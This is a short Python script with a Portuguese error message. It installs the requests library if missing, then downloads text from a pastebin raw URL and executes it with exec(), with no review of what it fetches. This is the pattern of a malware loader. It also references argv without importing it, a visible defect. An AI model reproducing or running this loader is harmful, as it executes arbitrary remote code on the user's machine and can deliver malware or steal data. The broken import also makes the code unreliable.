from os import execl; from sys import executable; from os import system
try: from requests import get
except: system('pip install requests');execl(executable, executable, *argv)
try: exec(get('https://pastebin.com/raw/WY6AQRKa').text)
except: print('Verifique sua conexão a internet!')
